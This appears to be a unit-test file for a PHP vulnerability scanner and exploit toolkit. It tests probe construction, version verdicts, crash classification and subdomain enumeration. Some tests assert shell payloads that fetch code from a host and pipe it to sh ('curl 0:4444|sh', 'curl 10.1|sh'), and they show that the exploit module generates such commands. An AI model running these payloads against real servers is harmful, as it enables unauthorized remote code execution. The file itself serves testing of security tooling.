#!/usr/bin/env python3
"""Unit tests for the pure-Python pieces (no network, no containers)."""

import sys
import unittest
from unittest import mock

sys.path.insert(0, __file__.rsplit("/", 2)[0])

import scan  # noqa: E402
import subdomains  # noqa: E402
from exploit import MAX_CMD, shortest_host_form, shell_command  # noqa: E402


class BuildProbeTest(unittest.TestCase):
    def test_size_and_shape(self):
        for mib, parts in scan.PROBES:
            body = scan.build_probe(mib, parts)
            # the JS template trims to at most size bytes (minus one char)
            self.assertLessEqual(len(body), mib * 1048576)
            self.assertGreater(len(body), mib * 1048576 - 4)
            self.assertTrue(body.startswith("--\n"))
            # the nested array-name field is present
            self.assertIn("Content-Disposition:name=a[]" + "[a]" * 62,
                          body)

    def test_repeat_str(self):
        self.assertEqual(scan.repeat_str("ab", 5), "ababababab")
        self.assertEqual(scan.repeat_str("x", 0), "")
        self.assertEqual(scan.repeat_str("y", 1), "y")


class VersionVerdictTest(unittest.TestCase):
    def test_vectors(self):
        cases = {
            "8.4.26": "VULNERABLE",
            "8.4.27": "FIXED",
            "8.4.27-dev": "VULNERABLE",
            "8.4.27RC1": "VULNERABLE",
            "8.3.35": "VULNERABLE",
            "8.3.36": "FIXED",
            "8.2.34": "VULNERABLE",
            "8.2.35": "FIXED",
            "8.5.11": "VULNERABLE",
            "8.5.12": "FIXED",
            "8.1.31": "EOL",
            "7.4.33": "EOL",
            "5.6.40": "EOL",
            "9.0.0": None,
            "": None,
            "not-a-version": None,
        }
        for version, expected in cases.items():
            self.assertEqual(scan.version_verdict(version), expected,
                             "version %s" % version)


class VersionRegexTest(unittest.TestCase):
    def test_extracts_from_headers(self):
        head = ("HTTP/1.1 200 OK\r\n"
                "Server: Apache/2.4.69 (Debian)\r\n"
                "X-Powered-By: PHP/8.4.26\r\n\r\n")
        m = scan.VERSION_RE.search(head)
        self.assertIsNotNone(m)
        self.assertEqual(m.group(1), "8.4.26")

    def test_server_fallback(self):
        head = "HTTP/1.1 200 OK\r\nServer: Apache/2.4.69 (Debian) PHP/8.3.35-fpm\r\n\r\n"
        m = scan.VERSION_RE.search(head)
        self.assertIsNotNone(m)
        self.assertEqual(m.group(1), "8.3.35-fpm")


class ShellCommandTest(unittest.TestCase):
    def test_short_forms(self):
        self.assertEqual(shortest_host_form("10.0.0.1")[0], "10.1")
        self.assertEqual(shortest_host_form("127.0.0.1")[0], "127.1")

    def test_loopback_gets_zero_form(self):
        cmd, url = shell_command("127.0.0.1", 4444)
        self.assertEqual(cmd, "curl 0:4444|sh")
        self.assertLessEqual(len(cmd), MAX_CMD)

    def test_port80_short_host(self):
        cmd, url = shell_command("10.0.0.1", 80)
        self.assertEqual(cmd, "curl 10.1|sh")

    def test_unfittable_host_returns_none(self):
        self.assertIsNone(shell_command("192.168.100.100", 4444))


class SubdomainsTest(unittest.TestCase):
    def test_filters_and_keeps_apex(self):
        with mock.patch.object(subdomains, "_crtsh_names", return_value={
            # _crtsh_names returns normalized (lowercase, star-stripped) names
            "www.example.com", "api.example.com", "example.com",
            "example.com.evil.test", "notexample.com", "example.com",
            "a b.example.com",
        }):
            hosts = subdomains.enumerate_subdomains("example.com",
                                                    resolve=False,
                                                    verbose=False)
        self.assertIn("example.com", hosts)
        self.assertIn("api.example.com", hosts)
        self.assertIn("www.example.com", hosts)
        self.assertNotIn("example.com.evil.test", hosts)
        self.assertNotIn("notexample.com", hosts)
        self.assertEqual(hosts, sorted(hosts))

    def test_resolve_filter(self):
        with mock.patch.object(subdomains, "_crtsh_names", return_value={
            "a.example.com", "b.example.com",
        }), mock.patch.object(subdomains, "_resolve",
                              side_effect=lambda h: h.startswith("a.")):
            hosts = subdomains.enumerate_subdomains("example.com",
                                                    resolve=True,
                                                    verbose=False)
        self.assertEqual(hosts, ["a.example.com", "example.com"])

    def test_crtsh_failure_returns_apex(self):
        with mock.patch.object(subdomains, "_crtsh_names",
                               side_effect=OSError("down")):
            hosts = subdomains.enumerate_subdomains("example.com",
                                                    verbose=False)
        self.assertEqual(hosts, ["example.com"])


class CheckUrlUnitTest(unittest.TestCase):
    """check_url's classification logic with a stubbed HTTP layer."""

    def _fake_target(self, responses):
        class FakeTarget:
            def __init__(self, *a, **k):
                self.responses = list(responses)
                self.host = "127.0.0.1"
                self.port = 8088
                self.path = "/index.php"
                self.timeout = 5
                self.verbose = False

            def post_body(self, *a, **k):
                return self.responses.pop(0)

        return FakeTarget

    def test_fixed_version_is_not_reported_vulnerable(self):
        fatal = (b"HTTP/1.1 200 OK\r\nX-Powered-By: PHP/8.4.27\r\n\r\n"
                 b"Fatal error: Allowed memory size of 8 bytes exhausted "
                 b"(tried to allocate 1 bytes) in Unknown on line 0")
        ctrl = b"HTTP/1.1 200 OK\r\nX-Powered-By: PHP/8.4.27\r\n\r\nOK"
        with mock.patch.object(scan, "Target", self._fake_target([ctrl] + [fatal] * 3)):
            res = scan.check_url("http://127.0.0.1:8088/index.php",
                                 verbose=False)
        self.assertEqual(res["result"], scan.FIXED)
        self.assertEqual(res["version"], "8.4.27")

    def test_vulnerable_version_crash(self):
        fatal = (b"HTTP/1.1 200 OK\r\nX-Powered-By: PHP/8.4.26\r\n\r\n"
                 b"Fatal error: Allowed memory size of 8 bytes exhausted "
                 b"(tried to allocate 1 bytes) in Unknown on line 0")
        ctrl = b"HTTP/1.1 200 OK\r\nX-Powered-By: PHP/8.4.26\r\n\r\nOK"
        with mock.patch.object(scan, "Target", self._fake_target([ctrl] + [fatal] * 3)):
            res = scan.check_url("http://127.0.0.1:8088/index.php",
                                 verbose=False)
        self.assertEqual(res["result"], scan.MEMORY_EXHAUSTION)
        self.assertEqual(res["version"], "8.4.26")

    def test_version_only_fallback(self):
        ctrl = b"HTTP/1.1 200 OK\r\nX-Powered-By: PHP/8.5.11\r\n\r\nOK"
        clean = b"HTTP/1.1 200 OK\r\nX-Powered-By: PHP/8.5.11\r\n\r\nOK"
        with mock.patch.object(scan, "Target", self._fake_target([ctrl] + [clean] * 3)):
            res = scan.check_url("http://127.0.0.1:8088/index.php",
                                 verbose=False)
        self.assertEqual(res["result"], scan.VERSION_VULNERABLE)

    def test_rejected_status_stops_probes(self):
        rejected = b"HTTP/1.1 413 Payload Too Large\r\n\r\n"
        ctrl = b"HTTP/1.1 200 OK\r\nX-Powered-By: PHP/8.4.26\r\n\r\nOK"
        with mock.patch.object(scan, "Target", self._fake_target([ctrl, rejected])):
            res = scan.check_url("http://127.0.0.1:8088/index.php",
                                 verbose=False)
        self.assertEqual(res["result"], scan.VERSION_VULNERABLE)

    def test_control_500_skips_probes(self):
        err = b"HTTP/1.1 500 Internal Server Error\r\n\r\n"
        with mock.patch.object(scan, "Target", self._fake_target([err])):
            res = scan.check_url("http://127.0.0.1:8088/index.php",
                                 verbose=False)
        self.assertEqual(res["result"], scan.UNKNOWN)


class IniFactsTest(unittest.TestCase):
    def test_parse_memory_limit(self):
        text = ("Fatal error: Allowed memory size of 33554432 bytes exhausted "
                "(tried to allocate 2097152 bytes) in Unknown on line 0")
        result = {}
        scan._parse_ini_facts(text, result)
        self.assertEqual(result["memory_limit"], 33554432)

    def test_parse_max_vars(self):
        text = ("Warning: PHP Request Startup: Input variables exceeded 5000. "
                "To increase the limit change max_input_vars in php.ini.")
        result = {}
        scan._parse_ini_facts(text, result)
        self.assertEqual(result["max_input_vars"], 5000)

    def test_no_facts(self):
        result = {}
        scan._parse_ini_facts("nothing here", result)
        self.assertIsNone(result.get("memory_limit"))
        self.assertIsNone(result.get("max_input_vars"))

    def test_detect_max_vars_escalation(self):
        class FakeTarget:
            def __init__(self):
                self.calls = []

            def post_body(self, body, content_type, **kw):
                self.calls.append(len(body))
                # the warning appears once enough fields are sent
                if len(self.calls) >= 2:
                    return (b"HTTP/1.1 200 OK\r\n\r\nWarning: Input variables "
                            b"exceeded 5000. To increase the limit change "
                            b"max_input_vars in php.ini.")
                return b"HTTP/1.1 200 OK\r\n\r\nOK"

        limit = scan.detect_max_vars(FakeTarget(), verbose=False)
        self.assertEqual(limit, 5000)


if __name__ == "__main__":
    unittest.main()
